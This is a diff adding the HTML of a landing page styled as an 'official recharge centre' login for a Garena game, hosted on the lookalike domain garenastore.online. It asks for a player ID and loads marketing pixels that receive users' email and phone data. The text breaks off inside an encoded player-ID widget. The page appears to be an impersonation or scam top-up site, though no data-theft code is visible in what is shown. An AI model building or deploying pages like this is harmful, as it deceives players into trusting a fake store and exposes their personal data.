@@ -1,0 +1,525 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<title>Acesso Jogador</title><link rel="canonical" href="https://tienda.garenastore.online/login"><link rel="shortcut icon" href="images/favicon.ico"><meta property="og:title" content="Acesso Jogador"><meta property="og:url" content="https://tienda.garenastore.online/login"><meta property="og:type" content="website"><meta property="og:locale" content="pt_BR"><link href="https://fonts.googleapis.com/css2?family=Inter:wght@100..900&family=Nunito:ital,wght@0,200..1000;1,200..1000&display=swap" rel="stylesheet">
+<meta name="viewport" content="width=device-width, initial-scale=1.0" id="lp-meta">
+<!-- Precisa dos 2 kits do fontawesome para carregar os .woff -->
+<!-- ICONES SVG -->
+<!-- <script src="https://kit.fontawesome.com/5a382b57c2.js" crossorigin></script> -->
+
+<!-- FONTES NORMAIS -->
+<script src="js/cdb0b0a676.js" async="" crossorigin="anonymous"></script>
+
+<!-- <script async src="https://app.landingpage.com.br/construtor/assets/scripts/glide/glide.min.js"></script> -->
+
+<!-- <script src="https://code.jquery.com/jquery-3.4.1.min.js" type="text/javascript"></script> // removido vitor, sem utilidade-->
+<link rel="preload" as="style" href="css/prod.css">
+<link rel="stylesheet" type="text/css" href="css/prod.css">
+<link rel="preload" as="style" href="css/animate.css">
+<link rel="stylesheet" type="text/css" href="css/animate.css">
+<link rel="preload" as="style" href="css/animate-prod.css">
+<link rel="stylesheet" type="text/css" href="css/animate-prod.css">
+<link rel="preload" as="style" href="css/glide.core.min.css">
+<link rel="stylesheet" type="text/css" href="css/glide.core.min.css">
+<link rel="preload" as="style" href="css/glide.theme.css">
+<link rel="stylesheet" type="text/css" href="css/glide.theme.css">
+<link rel="preload" as="style" href="css/tooltip.css">
+<link rel="stylesheet" type="text/css" href="css/tooltip.css">
+
+<style>
+	body,
+	html {
+		font-family: 'Nunito', sans-serif;
+	}
+
+	.is-wrapper {
+		margin: auto !important;
+
+		/* overflow-x: hidden; */
+		/* overflow-y: auto; */
+	}
+
+	/* .mobile .is-wrapper {
+			margin-right: auto !important;
+			margin-left: auto !important;
+		} */
+
+	.mobile-travado .is-wrapper {
+		/* overflow: hidden; */
+		/* height: 100% !important; */
+	}
+
+	.mobile-apenasmob .is-wrapper {
+		overflow: hidden;
+	}
+
+	.mobile-desk .is-wrapper {
+		overflow: hidden;
+	}
+
+	@media only screen and (min-width: 1023px) {
+		.is-wrapper {
+			overflow: hidden;
+		}
+	}
+
+	.esconder {
+		display: none;
+	}
+
+	.parallax>div>div {
+		/* background-attachment: fixed; */
+		/* background-position: 100% 100% !important; */
+	}
+
+	/* CSS specific to iOS devices */
+	@supports (-webkit-touch-callout: none) {
+		.is-section.section-flex .is-block--flex {
+			align-items: flex-start !important;
+			align-content: flex-start !important;
+		}
+	}
+
+	@media only screen and (max-width: 600px) {
+		.is-wrapper {
+			overflow-x: clip;
+			/* overflow-y: hidden; */
+		}
+
+		body ::-webkit-scrollbar {
+			width: 0px !important;
+		}
+	}
+
+	.is-block.contador-novo.contador-landingpage.hide-prod {
+		display: none !important;
+	}
+
+	.is-block.fill-block {
+		width: 100% !important;
+		left: 0px !important;
+		margin-left: 0px !important
+	}
+
+	body .is-wrapper .is-section.pop-up-container {
+		opacity: 0;
+		visibility: hidden;
+		pointer-events: none;
+		margin: 0 !important;
+		height: 100vh;
+		width: 100vw !important;
+		position: fixed !important;
+		top: 0 !important;
+		left: 0 !important;
+		z-index: 3002;
+		transition: .2s
+	}
+
+	.is-section.pop-up-container * {
+		pointer-events: none
+	}
+
+	body .is-wrapper .is-section.pop-up-container.active {
+		opacity: 1;
+		visibility: visible;
+		transition: .2s
+	}
+
+	body .is-wrapper .is-section.pop-up-container.active * {
+		pointer-events: initial
+	}
+
+	.overlay-forma-inferior,
+	.overlay-forma-inferior * {
+		pointer-events: none !important;
+	}
+</style>
+
+
+<style>.mobile .g-EUEx4DO { height: 54px !important; }.g-EUEx4DO { height: 60px !important; }.g-pePiUTu { margin-left: calc(50% - 490px); z-index: 100; --btn-width: 128px; --btn-height: 50px; display: flex !important; width: 128px !important; height: 50px !important; left: 9.1432px !important; top: 5px !important; }.g-TdXbKx4 { z-index: 2; border-radius: 0px !important; }.mobile .g-TdXbKx4 { border-radius: 0px !important; }.mobile .g-pePiUTu { --btn-width: 111px; --btn-height: 43px; display: flex !important; width: 111px !important; height: 43px !important; left: 14px !important; top: 5.5px !important; }.mobile .g-pePiUTu img { object-fit: cover; }.g-NNTfHEk { background-position: 50% 50%; word-break: break-word; margin: 0px; background-size: 100%; font-family: Nunito; z-index: 2; line-height: inherit; background-image: none !important; height: auto !important; font-weight: 500 !important; border-radius: 0px !important; color: rgb(0, 0, 0) !important; letter-spacing: 0px !important; text-align: start !important; font-size: 20px !important; }.g-ftwcehG { margin-left: calc(50% - 490px); z-index: 100; --btn-width: 332px; height: auto !important; font-family: Nunito !important; display: flex !important; width: 332px !important; text-align: start !important; left: 144.285px !important; top: 18.5px !important; }.mobile .g-NNTfHEk { border-radius: 0px !important; font-size: 15px !important; }.mobile .g-ftwcehG { --btn-width: 211px; display: flex !important; width: 211px !important; left: 125px !important; top: 18.6902px !important; }.mobile .g-MTcp7av { height: 150px !important; }.g-MTcp7av { height: 478px !important; background-color: rgb(48, 48, 48) !important; background-image: unset !important; }.g-fIY266l { margin-left: calc(50% - 490px); z-index: 100; --btn-width: 961px; --btn-height: 427px; display: flex !important; width: 961px !important; height: 427px !important; left: 9.5003px !important; top: 25.4822px !important; }.g-KmZmIcj { z-index: 2; border-radius: 0px !important; }.mobile .g-KmZmIcj { border-radius: 0px !important; }.mobile .g-fIY266l { --btn-width: 342px; --btn-height: 152px; display: flex !important; width: 342px !important; left: 9px !important; top: 10px !important; height: auto !important; }.mobile .g-fIY266l img { object-fit: cover; border-radius: 15px !important; }.g-fIY266l img { border-radius: 15px !important; }.mobile .g-hOZBcEk { height: 155px !important; }.g-hOZBcEk { height: 227px !important; }.g-qlTinLQ { background-image: url("images/mfopg8014944.png"); background-size: cover; background-repeat: no-repeat; }.g-qFS67wC { margin-left: calc(50% - 490px); z-index: 100; --btn-width: 332px; height: auto !important; font-family: Nunito !important; display: flex !important; width: 332px !important; text-align: start !important; left: 18.5667px !important; top: 17.5px !important; }.mobile .g-qFS67wC { display: flex !important; width: 315px !important; left: 14px !important; top: 12px !important; }.g-UzZlW5Z { background-position: 50% 50%; word-break: break-word; margin: 0px; background-size: 100%; font-family: Nunito; z-index: 2; line-height: inherit; background-image: none !important; height: auto !important; font-weight: 500 !important; border-radius: 0px !important; color: rgb(0, 0, 0) !important; letter-spacing: 0px !important; text-align: start !important; font-size: 20px !important; }.mobile .g-UzZlW5Z { border-radius: 0px !important; font-size: 15px !important; }.g-HYNGPwT { text-align: start !important; font-size: 20px !important; }.g-lbnuB3d { margin-left: calc(50% - 490px); z-index: 100; --btn-width: 122px; --btn-height: 150px; display: flex !important; width: 122px !important; height: 150px !important; left: 18.5716px !important; top: 59.0429px !important; }.g-EClRPiQ { z-index: 2; border-radius: 0px !important; }.mobile .g-EClRPiQ { border-radius: 0px !important; }.mobile .g-lbnuB3d { --btn-width: 80px; --btn-height: 98px; display: flex !important; width: 80px !important; height: 98px !important; left: 10px !important; top: 41.5px !important; }.mobile .g-lbnuB3d img { object-fit: cover; }.g-yo5PvVH { text-align: start !important; font-size: 20px !important; }.mobile .g-wuOqG0G { height: 412px !important; }.g-wuOqG0G { height: 564px !important; }.g-CQR0SdC { margin-left: calc(50% - 490px); z-index: 100; --btn-width: 972px; --btn-height: 142px; display: flex !important; width: 972px !important; height: 142px !important; left: 11.5px !important; top: 17.25px !important; }.g-dO29e4x { z-index: 2; border-radius: 0px !important; }.mobile .g-dO29e4x { border-radius: 0px !important; }.mobile .g-CQR0SdC { width: 315px !important; left: 14px !important; height: 175px !important; display: none !important; top: -47px !important; }.mobile .g-CQR0SdC img { object-fit: cover; }.g-XIRpmjS { margin-left: calc(50% - 490px); z-index: 100; --btn-width: 40px; --btn-height: 40px; fill: rgb(216, 26, 13); display: flex !important; width: 40px !important; height: 40px !important; left: 16.5px !important; top: 189.25px !important; }.g-Leiut9k { text-transform: uppercase; color: rgb(255, 255, 255); transition: all; padding: 0px 15px; z-index: 2; border-width: 0px; border-style: solid; border-color: rgb(17, 17, 17); letter-spacing: 0px; background-color: unset; background-image: linear-gradient(90deg, rgb(216, 26, 13), rgb(216, 26, 13), rgb(0, 153, 255), rgb(0, 153, 255)); justify-content: center !important; font-size: 18px !important; font-family: Inter !important; font-weight: 400 !important; border-radius: 5.4px !important; }.mobile .g-XIRpmjS { z-index: 100; --btn-width: 40px; --btn-height: 40px; display: flex !important; width: 40px !important; left: 13px !important; height: 40px !important; top: 82px !important; }.mobile .g-Leiut9k { background-color: unset; font-size: 18px !important; border-radius: 3.6px !important; }.g-uxN6anF { margin-left: calc(50% - 490px); z-index: 100; --btn-width: 332px; height: auto !important; font-family: Nunito !important; display: flex !important; width: 332px !important; text-align: start !important; left: 66.812px !important; top: 197px !important; }.mobile .g-uxN6anF { --btn-width: 155px; display: flex !important; width: 155px !important; left: 62px !important; top: 92px !important; }.g-eJHO8VK { background-position: 50% 50%; word-break: break-word; margin: 0px; background-size: 100%; font-family: Nunito; z-index: 2; line-height: inherit; background-image: none !important; height: auto !important; font-weight: 500 !important; border-radius: 0px !important; color: rgb(0, 0, 0) !important; letter-spacing: 0px !important; text-align: start !important; font-size: 20px !important; }.mobile .g-eJHO8VK { border-radius: 0px !important; font-size: 18px !important; }.g-hxBpx9d { font-size: 20px !important; }.g-bZd4uZK { text-align: start !important; font-size: 20px !important; }.mobile .g-TnzUoDG { height: 123px !important; }.g-TnzUoDG { background-color: rgb(48, 48, 48) !important; background-image: unset !important; height: 125px !important; }.g-PRTMDlH { background-position: 50% 50%; word-break: break-word; margin: 0px; background-size: 100%; font-family: Nunito; z-index: 2; line-height: inherit; background-image: none !important; height: auto !important; font-weight: 500 !important; border-radius: 0px !important; color: rgb(255, 255, 255) !important; letter-spacing: 0px !important; text-align: start !important; font-size: 12px !important; }.g-SqrDjUC { margin-left: calc(50% - 490px); z-index: 100; --btn-width: 255px; height: auto !important; font-family: Nunito !important; display: flex !important; text-align: start !important; width: 255px !important; left: 189.611px !important; top: 24px !important; }.mobile .g-PRTMDlH { border-radius: 0px !important; font-size: 12px !important; }.mobile .g-SqrDjUC { display: flex !important; width: 315px !important; top: 15px !important; left: 23px !important; }.g-BZXHVpd { text-align: start !important; font-size: 12px !important; }.g-Wd4KfvA { margin-left: calc(50% - 490px); z-index: 100; --btn-width: 255px; height: auto !important; font-family: Nunito !important; display: flex !important; text-align: start !important; width: 255px !important; left: 535.547px !important; top: 24px !important; }.mobile .g-Wd4KfvA { display: flex !important; width: 315px !important; left: 22.5px !important; top: 43px !important; }.g-DlWukTg { background-position: 50% 50%; word-break: break-word; margin: 0px; background-size: 100%; font-family: Nunito; z-index: 2; line-height: inherit; background-image: none !important; height: auto !important; font-weight: 500 !important; border-radius: 0px !important; color: rgb(255, 255, 255) !important; letter-spacing: 0px !important; text-align: start !important; font-size: 12px !important; }.mobile .g-DlWukTg { border-radius: 0px !important; font-size: 12px !important; }.g-UGmfJeb { text-align: start !important; font-size: 12px !important; }.g-GjsF7J2 { margin-left: calc(50% - 490px); z-index: 100; --btn-width: 255px; height: auto !important; font-family: Nunito !important; display: flex !important; text-align: start !important; width: 255px !important; left: 535.54px !important; top: 53px !important; }.mobile .g-GjsF7J2 { display: flex !important; width: 315px !important; left: 22.5px !important; top: 66.1015px !important; }.g-nyMVEaz { background-position: 50% 50%; word-break: break-word; margin: 0px; background-size: 100%; font-family: Nunito; z-index: 2; line-height: inherit; background-image: none !important; height: auto !important; font-weight: 500 !important; border-radius: 0px !important; color: rgb(255, 255, 255) !important; letter-spacing: 0px !important; text-align: start !important; font-size: 12px !important; }.mobile .g-nyMVEaz { border-radius: 0px !important; font-size: 12px !important; }.g-bYvhehE { text-align: start !important; font-size: 12px !important; }.g-Cp9V6RZ { margin-left: calc(50% - 490px); z-index: 100; --btn-width: 255px; height: auto !important; font-family: Nunito !important; display: flex !important; text-align: start !important; width: 255px !important; left: 535.525px !important; top: 82px !important; }.mobile .g-Cp9V6RZ { display: flex !important; width: 315px !important; left: 22.5px !important; top: 89.5578px !important; }.g-XkMyXs2 { background-position: 50% 50%; word-break: break-word; margin: 0px; background-size: 100%; font-family: Nunito; z-index: 2; line-height: inherit; background-image: none !important; height: auto !important; font-weight: 500 !important; border-radius: 0px !important; color: rgb(255, 255, 255) !important; letter-spacing: 0px !important; text-align: start !important; font-size: 12px !important; }.mobile .g-XkMyXs2 { border-radius: 0px !important; font-size: 12px !important; }.g-qk6v3KB { text-align: start !important; font-size: 12px !important; }.mobile .g-yo5PvVH { font-size: 15px !important; }.mobile .g-EKUNjGI { font-size: 15px !important; }.mobile .g-HYNGPwT { font-size: 15px !important; }.mobile .g-hxBpx9d { font-size: 18px !important; }.mobile .g-bZd4uZK { font-size: 18px !important; }.g-sB2tjHl { margin-left: calc(50% - 490px); z-index: 100; width: 343px !important; display: none !important; left: 318.5px !important; top: 9.05px !important; height: auto !important; }.g-prlAQio { z-index: 2; border-radius: 0px !important; }.mobile .g-prlAQio { border-radius: 0px !important; }.mobile .g-sB2tjHl { z-index: 100; display: flex !important; left: 8.5px !important; top: 9.05px !important; height: auto !important; }.mobile .g-BZXHVpd { font-size: 12px !important; }.mobile .g-yg4Uivt { font-size: 12px !important; }.mobile .g-UGmfJeb { font-size: 12px !important; }.mobile .g-MehfYqT { font-size: 12px !important; }.mobile .g-bYvhehE { font-size: 12px !important; }.mobile .g-qMTbukb { font-size: 12px !important; }.mobile .g-qk6v3KB { font-size: 12px !important; }.g-HgiOajw { margin-left: calc(50% - 490px); z-index: 100; --btn-width: 423px; --btn-height: 117px; display: flex !important; width: 423px !important; height: 117px !important; left: 5.38894px !important; top: 239.973px !important; }.mobile .g-HgiOajw { --btn-width: 339px; --btn-height: 99px; z-index: 350; border-radius: 0px !important; display: flex !important; width: 315px !important; left: 13px !important; height: 99px !important; top: 132px !important; }.g-iWbRuIT { margin-left: calc(50% - 490px); z-index: 100; --btn-width: 392px; height: auto !important; font-family: Nunito !important; display: flex !important; text-align: start !important; width: 392px !important; left: 16.4637px !important; top: 365.111px !important; }.mobile .g-iWbRuIT { --btn-width: 339px; display: flex !important; width: 339px !important; left: 13px !important; top: 245px !important; }.g-Lnqjnbi { background-position: 50% 50%; word-break: break-word; margin: 0px; background-size: 100%; font-family: Nunito; z-index: 2; line-height: inherit; background-image: none !important; height: auto !important; font-weight: 500 !important; border-radius: 0px !important; color: rgb(0, 0, 0) !important; letter-spacing: 0px !important; text-align: start !important; font-size: 18px !important; }.mobile .g-Lnqjnbi { border-radius: 0px !important; font-size: 15px !important; }.g-cG7ysY9 { font-size: 18px !important; }.mobile .g-cG7ysY9 { font-size: 15px !important; }.g-Nr0TKnZ { text-align: start !important; font-size: 18px !important; }.mobile .g-Nr0TKnZ { font-size: 15px !important; }.g-lm4CQG5 { margin-left: calc(50% - 490px); z-index: 100; --btn-width: 332px; height: auto !important; font-family: Nunito !important; display: flex !important; text-align: start !important; width: 332px !important; left: 76.453px !important; top: 437.507px !important; }.mobile .g-lm4CQG5 { --btn-width: 254px; display: flex !important; width: 254px !important; left: 62px !important; top: 308.859px !important; }.g-ffGqrUh { background-position: 50% 50%; word-break: break-word; margin: 0px; background-size: 100%; font-family: Nunito; z-index: 2; line-height: inherit; background-image: none !important; height: auto !important; font-weight: 500 !important; border-radius: 0px !important; color: rgb(0, 0, 0) !important; letter-spacing: 0px !important; text-align: start !important; font-size: 18px !important; }.mobile .g-ffGqrUh { border-radius: 0px !important; font-size: 14px !important; }.g-uDotP7n { font-size: 18px !important; }.mobile .g-uDotP7n { font-size: 14px !important; }.g-tu84WvJ { text-align: start !important; font-size: 18px !important; }.mobile .g-tu84WvJ { font-size: 14px !important; }.g-gOIDfL6 { margin-left: calc(50% - 490px); border-color: rgb(216, 26, 13); z-index: 99; --btn-width: 406px; --btn-height: 90px; display: flex !important; background-color: rgb(255, 244, 244) !important; background-image: none !important; border-width: 2px !important; border-style: solid !important; width: 406px !important; height: 90px !important; border-radius: 14.85px !important; top: 421.959px !important; left: 16.4444px !important; }.mobile .g-gOIDfL6 { --btn-width: 315px; --btn-height: 74px; display: flex !important; width: 315px !important; height: 74px !important; border-radius: 7.77px !important; top: 296px !important; left: 13px !important; }.g-rxr7i5L { margin-left: calc(50% - 490px); z-index: 100; --btn-width: 42px; --btn-height: 42px; display: flex !important; width: 42px !important; height: 42px !important; left: 24.7773px !important; top: 437.688px !important; }.g-afopz0M { z-index: 2; border-radius: 0px !important; }.mobile .g-afopz0M { border-radius: 0px !important; }.mobile .g-rxr7i5L { --btn-width: 33px; --btn-height: 33px; display: flex !important; width: 33px !important; height: 33px !important; left: 20px !important; top: 316.5px !important; }.mobile .g-rxr7i5L img { object-fit: cover; }.mobile .g-sB2tjHl img { border-radius: 5px !important; }.g-sB2tjHl img { border-radius: 5px !important; }</style><script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+
+<script>
+  window.pixelId = "68fc7dae2e8b8c66b2b1e042";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+<meta name="referrer" content="no-referrer">
+
+	
+	<script>
+		function buscarClientIdGA4() {
+			return new Promise((resolve) => {
+				gtag('get', '', 'client_id',
+					function(clientID) {
+						resolve(clientID);
+					});
+			});
+		}
+
+		function buscarSessionIdGA4() {
+			return new Promise((resolve) => {
+				gtag('get', '', 'session_id',
+					function(sessionId) {
+						resolve(sessionId);
+					});
+			});
+		}
+
+		document.addEventListener('DOMContentLoaded', function() {
+			let tentativas = 0;
+			const maxTentativas = 30; // 30 tentativas = ~15 segundos (500ms entre tentativas)
+			const intervaloTentativa = 500; // 500ms
+
+			function tentarBuscarGA4Params() {
+				tentativas++;
+
+				if (typeof gtag === 'function') {
+					Promise.all([
+						buscarClientIdGA4().catch(() => null),
+						buscarSessionIdGA4().catch(() => null)
+					]).then(([clientId, sessionId]) => {
+						if (clientId || sessionId) {
+							// Sucesso - salvamos os dados
+							window['lp_ga4_params_1743185531'] = {
+								client_id: clientId,
+								session_id: sessionId,
+								timestamp: Date.now()
+							};
+							return;
+						}
+
+						// Se não conseguiu e ainda tem tentativas, tenta novamente
+						if (tentativas < maxTentativas) {
+							setTimeout(tentarBuscarGA4Params, intervaloTentativa);
+						}
+					});
+				} else {
+					// gtag não está disponível ainda
+					if (tentativas < maxTentativas) {
+						setTimeout(tentarBuscarGA4Params, intervaloTentativa);
+					}
+				}
+			}
+
+			// Inicia as tentativas
+			tentarBuscarGA4Params();
+		});
+
+		async function sendLandingpageEventsToTracker(events_to_execute) {
+			if (!events_to_execute) return 0;
+
+			let totalSentEventsWithoutcallback = 0;
+
+			try {
+				if (typeof fbq === 'function' && Array.isArray(events_to_execute['fbq'])) {
+
+					if (events_to_execute['configs'] && events_to_execute['configs']['user_data']) {
+						Object.keys(window.fbq.instance.pixelsByID).forEach(pixelId => {
+							if (events_to_execute['configs']['user_data']?.email_address) {
+								window.fbq.instance.pixelsByID[pixelId].userData['em'] = events_to_execute['configs']['user_data'].email_address.toLowerCase().trim();
+							}
+
+							if (events_to_execute['configs']['user_data']?.phone_number) {
+								window.fbq.instance.pixelsByID[pixelId].userData['ph'] = events_to_execute['configs']['user_data'].phone_number.replace(/\D/g, '');
+							}
+						});
+					}
+
+					events_to_execute['fbq'].forEach(event => {
+						totalSentEventsWithoutcallback++;
+						fbq(event['param_1'], event['param_2'], event['param_3'], event['param_4']);
+					});
+				}
+			} catch (err) {
+				console.log('erro ao enviar eventos para o tracker fbq', err);
+			}
+
+			try {
+				if (typeof gtag === 'function' && Array.isArray(events_to_execute['ga4']) && events_to_execute['ga4'].length > 0) {
+					await Promise.all(
+
+						events_to_execute['ga4'].map(event => {
+
+							if (typeof event['param_3'] !== 'object') {
+								event['param_3'] = {};
+							}
+
+							return Promise.race([
+								new Promise(resolve => {
+									event['param_3']['event_callback'] = () => resolve(true);
+									event['param_3']['event_timeout'] = 2000;
+									event['param_3']['transport_type'] = 'beacon';
+									gtag(event['param_1'], event['param_2'], event['param_3']);
+								}),
+								new Promise(resolve => setTimeout(() => resolve(false), 1500))
+							]);
+						})
+					);
+				}
+			} catch (err) {}
+
+			try {
+				if (typeof dataLayer !== 'undefined' && Array.isArray(dataLayer) && Array.isArray(events_to_execute['gtm'])) {
+					events_to_execute['gtm'].forEach(event => {
+						totalSentEventsWithoutcallback++;
+						dataLayer.push(event['param_1']);
+					});
+				}
+			} catch (err) {}
+
+			return totalSentEventsWithoutcallback;
+		}
+	</script>
+</head>
+
+<body>
+	<script>
+	var telaMobile = false;
+
+	function setMobile() {
+		document.body.classList.add('mobile', 'mobile-travado');
+		try {
+			document.querySelector('#lp-meta').content = "width=360, user-scalable=yes";
+		} catch (err) {
+			var newMetaElement = document.createElement('meta');
+
+			newMetaElement.name = 'viewport';
+			newMetaElement.content = 'width=360, user-scalable=yes';
+			newMetaElement.id = 'lp-meta';
+
+			var headElement = document.head || document.getElementsByTagName('head')[0];
+
+			var existingMetaElement = document.getElementById('lp-meta');
+			if (existingMetaElement) {
+				headElement.removeChild(existingMetaElement);
+			}
+			headElement.appendChild(newMetaElement);
+		}
+	}
+
+	function setDesktop() {
+		document.body.classList.remove('mobile', 'mobile-travado', 'mobile-desk');
+		document.querySelector('#lp-meta').content = "width=device-width, initial-scale=1.0";
+
+		telaMobile = false;
+
+	}
+
+	// troca de view mobile/desktop quando faz o resize
+	function checkWidth(forcarMobile = false) {
+		if (forcarMobile) {
+			setMobile();
+		}
+		var width = window.innerWidth;
+
+		if (width >= 1024) {
+			setDesktop();
+		} else {
+			setMobile();
+
+			telaMobile = true;
+
+		}
+	}
+
+	checkWidth();
+
+	// Nome ruim, mas pega os js dos sliders
+	var teste_arr = [];
+</script>
+<main class="is-wrapper"><link href="https://fonts.googleapis.com/css2?family=Nunito&display=swap" rel="stylesheet" type="text/css" id="Nunito" crossorigin="anonymous"><section class="is-section g-EUEx4DO active" id="s-dftlELv" style="pointer-events: none; transform: translate3d(0px, 0px, 0px) rotate(0.0001deg); transform-style: preserve-3d; backface-visibility: hidden;"><div class="is-block novo-bloco is-text fit-content overlap g-pePiUTu bloco-imagem new-block-1 mob-alterado n-responsive mobile-alterado" spellcheck="false" data-height="43" data-originalpos="5">
+          <div class="landingpage-widget-imagem">
+            
+        <img loading="lazy" alt="Imagem" style="width: 100%; height: 100%;" src="images/68f413c53aabc.png" class="g-TdXbKx4 active" id="img_Cb59Tv0" data-width="111">
+    
+          </div>
+        </div><div class="fit-content g-ftwcehG is-block is-text new-block-1 mob-alterado n-responsive medium-editor-element" data-weightaceitos="200,300,400,600,700,800,900" data-fonte-index="16" data-originalpos="18" data-height="12.640600000000006" data-medium-editor-element="true" role="textbox" aria-multiline="true" data-medium-editor-editor-index="17" medium-editor-index="db2ac606-917d-686c-1f4e-98f77c82825a"> <h2 class="g-NNTfHEk">| Centro Oficial de Recargas<br class="g-yo5PvVH"></h2>
+</div></section><section class="is-section g-MTcp7av" id="s-uXcxOtI" style="pointer-events: none; transform: translate3d(0px, 0px, 0px) rotate(0.0001deg); transform-style: preserve-3d; backface-visibility: hidden;"><div class="is-block novo-bloco is-text fit-content overlap g-fIY266l bloco-imagem new-block-1 mob-alterado n-responsive mobile-alterado" spellcheck="false" data-height="152" data-originalpos="10">
+          <div class="landingpage-widget-imagem">
+            
+        <img loading="lazy" alt="Imagem" style="" src="images/68f413c6057f3.png" class="g-KmZmIcj active" id="img_QGQdUuG" data-width="342">
+    
+          </div>
+        </div></section><section class="is-section g-hOZBcEk" id="s-UeaSUc3" style="pointer-events: none; transform: translate3d(0px, 0px, 0px) rotate(0.0001deg); transform-style: preserve-3d; backface-visibility: hidden;"><div class="is-overlay"><div class="is-image-bg g-qlTinLQ" style="background-image: url(" https:="" empreender.nyc3.digitaloceanspaces.com="" landingpage="" 68f413c572e7d.png");"=""></div></div><div class="is-block novo-bloco is-text fit-content overlap g-lbnuB3d bloco-imagem new-block-1 mob-alterado n-responsive mobile-alterado" spellcheck="false" data-height="98" data-originalpos="41">
+          <div class="landingpage-widget-imagem">
+            
+        <img loading="lazy" alt="Imagem" style="width: 100%; height: 100%;" src="images/68f413c58f25c.png" class="g-EClRPiQ active" id="img_sQVh2aN" data-width="80">
+    
+          </div>
+        </div><div class="fit-content g-qFS67wC is-block is-text new-block-1 mob-alterado n-responsive medium-editor-element" data-weightaceitos="200,300,400,600,700,800,900" data-fonte-index="16" data-originalpos="12" data-medium-editor-element="true" role="textbox" aria-multiline="true" data-medium-editor-editor-index="17" medium-editor-index="11f6b6f9-5aa1-918d-1871-5ebc4b60449e"> <h2 class="g-UzZlW5Z"><b class="g-EKUNjGI">Seleção de Jogo</b><br class="g-HYNGPwT"></h2>
+</div></section><section class="is-section g-wuOqG0G" id="s-hesclOc" style="pointer-events: none; transform: translate3d(0px, 0px, 0px) rotate(0.0001deg); transform-style: preserve-3d; backface-visibility: hidden;">
+<div class="is-block novo-bloco is-text fit-content overlap g-CQR0SdC bloco-imagem new-block-1 mob-alterado n-responsive" spellcheck="false" data-height="100" data-originalpos="165">
+          <div class="landingpage-widget-imagem">
+            
+        <img loading="lazy" alt="Imagem" style="width: 100%; height: 100%;" src="images/68f413c5a7cb3.png" class="g-dO29e4x active" data-width="391" id="img_sobXCgQ">
+    
+          </div>
+        </div><div class="is-block bloco-texto novo-bloco is-text fit-content overlap g-sB2tjHl bloco-imagem new-block-1 block-mobile-only mob-alterado n-responsive" spellcheck="false" data-height="100" data-originalpos="9">
+          <div class="landingpage-widget-imagem">
+            
+        <img loading="lazy" alt="Imagem" style="" src="images/68f413c5e4734.png" class="g-prlAQio active" id="img_ifVeIzD">
+    
+          </div>
+        </div><div class="fit-content g-uxN6anF is-block is-text new-block-1 mob-alterado n-responsive medium-editor-element" data-weightaceitos="200,300,400,600,700,800,900" data-fonte-index="16" data-originalpos="100" data-height="20.6875" data-medium-editor-element="true" role="textbox" aria-multiline="true" data-medium-editor-editor-index="17" medium-editor-index="3ccf26e9-1e68-95d6-d948-9d6762f7fb7d"> <h2 class="g-eJHO8VK"><b class="g-hxBpx9d">Entrar</b><br class="g-bZd4uZK"></h2>
+</div><div class="is-block is-text fit-content block-btn g-XIRpmjS bloco-botao new-block-1 mob-alterado n-responsive medium-editor-element" spellcheck="false" data-weightaceitos="200,300,400,500,600,700,900" data-originalpos="100" data-height="40" data-medium-editor-element="true" role="textbox" aria-multiline="true" data-medium-editor-editor-index="2" medium-editor-index="2b5e17af-35a6-55c4-c9d4-f5be5ee6e4a7">
+        <a class="btn g-Leiut9k active hover-grad  infinite" href="#" data-num="5" style="height: 100%;">1</a>
+    </div><div class="is-block g-HgiOajw is-code medium-editor-element new-block-1 mob-alterado n-responsive" data-html="%3Cdiv%20style%3D%22max-width%3A%20400px%3B%20width%3A%20100%25%3B%20padding%3A%2010px%3B%20box-sizing%3A%20border-box%3B%20background-color%3A%20%23f5f5f5%3B%20border-radius%3A%206px%3B%20font-family%3A%20Arial%2C%20sans-serif%3B%22%3E%0A%20%20%3Clabel%20style%3D%22font-weight%3A%20bold%3B%20font-size%3A%2014px%3B%20color%3A%20%23000%3B%20display%3A%20block%3B%20margin-bottom%3A%205px%3B%22%3E%0A%20%20%20%20ID%20de%20jugador%20%3Cspan%20title%3D%22Escribe%20tu%20ID%20de%20jugador%22%20style%3D%22cursor%3A%20help%3B%22%3E%26%239432%3B%3C%2Fspan%3E%0A%20%20%3C%2Flabel%3E%0A%20%20%3Cdiv%20style%3D%22display%3A%20flex%3B%20border%3A%201px%20solid%20%23ccc%3B%20border-radius%3A%206px%3B%20overflow%3A%20hidden%3B%20background-color%3A%20white%3B%22%3E%0A%20%20%20%20%3Cinput%20%0A%20%20%20%20%20%20id%3D%22playerID%22%0A%20%20%20%20%20%20type%3D%22text%22%20%0A%20%20%20%20%20%20placeholder%3D%22Introduce%20el%20ID%20del%20jugador.%22%20%0A%20%20%20%20%20%20style%3D%22flex%3A%201%3B%20border%3A%20none%3B%20padding%3A%2010px%3B%20font-size%3A%2014px%3B%20outline%3A%20none%3B%20color%3A%20%23333%3B%22%20%2F%3E%0A%20%20%20%20%3Cbutton%20%0A%20%20%20%20%20%20id%3D%22startBtn%22%0A%20%20%20%20%20%20style%3D%22background-color%3A%20%23d32f2f%3B%20color%3A%20white%3B%20border%3A%20none%3B%20padding%3A%200%2020px%3B%20font-weight%3A%20bold%3B%20cursor%3A%20pointer%3B%22%3E%0A%20%20%20%20%20%20Iniciar%0A%20%20%20%20%3C%2Fbutton%3E%0A%20%20%3C%2Fdiv%3E%0A%3C%2Fdiv%3E%0A%0A%3C!--%20Popup%20--%3E%0A%3Cdiv%20id%3D%22popupOverlay%22%20style%3D%22display%3Anone%3B%20position%3Afixed%3B%20top%3A0%3B%20left%3A0%3B%20width%3A100%25%3B%20height%3A100%25%3B%20background-color%3Argba(0%2C0%2C0%2C0.7)%3B%20%0A%20%20align-items%3Acenter%3B%20justify-content%3Acenter%3B%20z-index%3A9999%3B%22%3E%0A%20%20%3Cdiv%20style%3D%22background%3Awhite%3B%20padding%3A30px%3B%20border-radius%3A12px%3B%20text-align%3Acenter%3B%20width%3A280px%3B%20box-shadow%3A0%200%2020px%20rgba(0%2C0%2C0%2C0.3)%3B%22%3E%0A%20%20%20%20%3Cdiv%20class%3D%22loader%22%20style%3D%22m